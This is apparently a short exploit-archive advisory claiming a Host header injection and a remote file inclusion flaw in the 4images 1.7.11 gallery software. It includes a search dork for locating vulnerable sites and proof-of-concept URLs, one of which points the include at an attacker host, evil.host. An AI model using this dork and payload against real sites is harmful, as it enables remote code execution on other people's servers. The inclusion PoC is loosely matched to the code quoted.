| # Title    : 4images 1.7.11 Multi Vulnerability
| # Author   : indoushka                                                               
| # email    : indoushka4ever@gmail.com                                                                                                                                                                 
| # Dork     : Powered by 4images 1.7.11
| # Tested on: windows 8.1 Fran√ßais V.(Pro)        
| # Download : http://www.4homepages.de/
=======================================

Host Header Attack :

Vulnerability description :

An attacker can manipulate the Host header as seen by the web application 
and cause the application to behave in unexpected ways. 
Developers often resort to the exceedingly untrustworthy HTTP Host header (_SERVER["HTTP_HOST"] in PHP). 
Even otherwise-secure applications trust this value enough to write it to the page without HTML-encoding it with code equivalent to: 
     <link href="http://_SERVER['HOST']"
This vulnerability affects /4images/index.php. 
Host header evilhostKdK2IXPv.com was reflected inside a LINK tag (href attribute).

Poc : http://127.0.0.1/4images/top.php/lightbox.php

R/L File inclusion :

C:\web\www\4images\global.php
LIne 400 : include_once(ROOT_PATH.'includes/db_'.strtolower($db_servertype).'.php');
Function  : include_once
Variables : $db_servertype

Poc : 127.0.0.1/4images/global.php?db_servertype=http://evil.host

Greetz : 
jericho  http://attrition.org & http://www.osvdb.org/ * packetstormsecurity.com * http://is-sec.org/cc/
Hussin-X * Stake (www.v4-team.com) * D4NB4R * ViRuS_Ra3cH * yasMouh * https://www.corelan.be * exploit4arab.net
---------------------------------------------------------------------------------------------------------------
